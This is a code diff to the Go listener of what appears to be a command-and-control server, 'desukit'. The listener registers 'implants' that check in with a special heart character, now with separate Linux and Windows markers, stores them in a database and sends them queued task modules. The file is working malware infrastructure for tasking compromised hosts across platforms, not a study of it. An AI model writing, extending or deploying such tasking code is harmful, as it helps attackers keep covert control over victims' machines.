@@ -16,6 +16,7 @@ import (
     "desukit/sqldb/controller/tasks"
 )
 
+
 func Start(ipaddr string, port string) {
 	CONN_HOST := ipaddr
 	CONN_PORT := port
@@ -98,17 +99,28 @@ func handleRequest(conn net.Conn) {
     ipaddr := conn.RemoteAddr().String()
 
     //Data must begin with "♥" character to be accepted by listener in order to filter random incoming data (port scanners)
-    checkchar, _ := utf8.DecodeRuneInString("♥")
+    var handle_client bool = false;
+    checkchar_linux, _ := utf8.DecodeRuneInString("♥")
+    checkchar_windows, _ := utf8.DecodeRuneInString("♡")
     checkcharrecv, _ := utf8.DecodeRuneInString(uuid[0:3])
+
+    var platform string;
+    if checkcharrecv == checkchar_linux {
+        handle_client = true;
+        platform = "linux" 
+    } else if checkcharrecv == checkchar_windows {
+        handle_client = true;
+        platform = "windows"
+    }
 
     t := time.Now()
     timestamp := t.Format("15:04:05 01-02-2006")
 
     //Implant will check in and pickup any tasks if assigned
-    if checkchar == checkcharrecv {
-        // Remove heart character
+    if  handle_client {
+        // Remove check character
         uuid = uuid[3:]
-		C := model.Client{uuid, ipaddr, timestamp, timestamp}
+		C := model.Client{uuid, ipaddr, platform, timestamp, timestamp}
         
         // Check for existince in DB
         exists := client.CheckClient(C)
@@ -122,9 +134,9 @@ func handleRequest(conn net.Conn) {
                 fmt.Println("Executing task...")
                 T := tasks.GetTask(C)
                 task_id := T.Task_ID
-                sendModule(conn, task_id)
                 fmt.Println("Clearing task queue...")
                 tasks.ClearTaskQueue(C)
+                sendModule(conn, task_id)
             } else {
                 conn.Close()
             }
